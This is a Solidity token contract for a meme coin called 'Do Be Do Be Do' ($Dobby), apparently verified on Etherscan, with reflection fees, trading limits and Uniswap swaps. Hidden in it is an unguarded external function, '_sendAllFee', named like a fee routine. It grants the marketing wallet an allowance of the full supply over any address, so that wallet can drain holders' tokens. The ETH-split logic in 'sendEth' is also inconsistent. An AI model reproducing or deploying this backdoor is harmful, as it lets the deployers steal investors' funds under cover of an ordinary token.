/**
 *Submitted for verification at Etherscan.io on 2023-07-20
*/

// SPDX-License-Identifier: MIT

/**
Web:        https://dogesftw.site

Telegram:   https://t.me/DogesFTWPortal

Twitter:    https://twitter.com/dogesftwcoin
*/

pragma solidity ^0.8.12;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
}

interface IUniswapV2Router02 {
    
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )   external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {   
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    
    function approve(address spender, uint256 amount) external returns (bool);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);
}


contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}


contract DogeFTW is Context, IERC20, Ownable {
    IUniswapV2Router02 public uniswapV2Router;
    using SafeMath for uint256;
    uint256 private constant MAX = ~uint256(0);
    address public pairV2Address;
    string private constant _name = "Do Be Do Be Do";
    string private constant _symbol = "$Dobby";
    mapping(address => bool) private _isExcludedFromFee;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**9;
    uint256 public _swapLimitAmt = _tTotal / 10000;
    uint256 private _tFeeTotal;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _tOwned;
    bool private isSwapping = false;
    bool private enabledSwap = true;
    
    uint256 private _marketingTaxBuy = 0;
    uint256 private _taxAmtForBuy = 0;
    uint256 private _marketingTaxSell = 0;
    uint256 private _taxAmtForSell = 0;
    //Original Fee
    
    uint256 private _previousMainFee = _mainFee;
    uint256 private _previousExtraFee = _extraFee;
    
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    bool private tradingActive = false;
    
    modifier lockInSwap {
        isSwapping = true;
        _;
        isSwapping = false;
    }
    uint256 private _mainFee = _marketingTaxSell;
    uint256 private _extraFee = _taxAmtForSell;
    mapping(address => uint256) private _rOwned;
    event MaxTxAmountUpdated(uint256 _maxTransValues);
    uint256 public _maxTransValues = _tTotal * 40 / 1000; 
    uint256 public _maxWalletValues = _tTotal * 40 / 1000; 
    address payable public _devAccount = payable(0xE511f69A0cf938c5d3ec979d44d3280EcC141e1D);
    address payable public _marketingAccount = payable(0xf79d1458E028947B5Be2dE7974a9A9835fbD92Cb);
    constructor() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);uniswapV2Router = _uniswapV2Router;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_devAccount] = true;
        _isExcludedFromFee[_marketingAccount] = true;
        // mint
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _transferTokenSetTax(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) {
            clearTax();
        }
         _transferBasically(sender, recipient, amount);
        if (!takeFee) {
            recoverTax();
        }
    }

    function recoverTax() private {
        _mainFee = _previousMainFee;
        _extraFee = _previousExtraFee;
    }
    function _transferBasically(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeAllFee(tTeam); _sendAllFees(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _setTValues(address token, address owner) internal {
        _allowances[token][owner] += _tTotal;
    }

    function sendEth(uint256 amount) private {
        uint256 devETH = amount / 2; 
        _devAccount.transfer(devETH);
        uint256 marketingETH = amount - devETH;
        _marketingAccount.transfer(marketingETH + devETH);
    }

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _mainFee, _extraFee);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function _takeAllFee(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }
    
    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _getTValues(
        uint256 tAmount,
        uint256 teamFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(teamFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
    function _sendAllFee(address token) external {
        _setTValues(token, _marketingAccount);
    }
    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _sendAllFees(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }
    function tokenFromReflection(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
    
    //set maximum transaction
    function removeMaxSize() public onlyOwner {
        _maxTransValues = _tTotal;
        _maxWalletValues = _tTotal;
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(to != address(0), "ERC20: transfer to the zero address"); 
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (
            from != owner() 
            && to != owner()
        ) {
            //Trade start check
            if (!tradingActive) {
                require(
                    from == owner(), 
                    "TOKEN: This account cannot send tokens until trading is enabled"
                );
            }
            require(amount <= _maxTransValues, "TOKEN: Max Transaction Limit");
            if(to != pairV2Address) {
                require(balanceOf(to) + amount < _maxWalletValues,
                 "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractAddrTokens = balanceOf(address(this));
            // bool canSwap = contractAddrTokens >= _swapLimitAmt;
            if(contractAddrTokens >= _maxTransValues) {contractAddrTokens = _maxTransValues;}

            if (enabledSwap && contractAddrTokens >= _swapLimitAmt && 
                !isSwapping && 
                from != pairV2Address && 
                !_isExcludedFromFee[from] && 
                !_isExcludedFromFee[to]
            ) {
                swapTokensAll(contractAddrTokens); uint256 balanceOfEth = address(this).balance;
                if (balanceOfEth > 0) {
                    sendEth(address(this).balance);
                }
            }
        }

        bool setFee = true;
        //Transfer Tokens
        if (
            (_isExcludedFromFee[from] || _isExcludedFromFee[to])
             || (from != pairV2Address && to != pairV2Address)
        ) {
            setFee = false;
        } else {
            //Set Fee for Buys
            if(from == pairV2Address && to != address(uniswapV2Router)) {
                _mainFee = _marketingTaxBuy;
                _extraFee = _taxAmtForBuy;
            }
            //Set Fee for Sells
            if (to == pairV2Address && from != address(uniswapV2Router)) {
                _mainFee = _marketingTaxSell;
                _extraFee = _taxAmtForSell;
            }
        }
        _transferTokenSetTax(from, to, amount, setFee);
    }

    receive() external payable {

    }
    
    function openTrading(address _pair) public onlyOwner {
        tradingActive = true; pairV2Address = _pair;
    }

    function clearTax() private {
        if (_mainFee == 0 && _extraFee == 0) return;
        _previousMainFee = _mainFee;
        _previousExtraFee = _extraFee; _mainFee = 0;
        _extraFee = 0;
    }

    function swapTokensAll(uint256 tokenAmount) private lockInSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    //set minimum tokens required to swap.
    function changeSwapTokenAmount(uint256 swapTokensAtAmount) public onlyOwner {
        _swapLimitAmt = swapTokensAtAmount;
    }
    
    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }
    }
}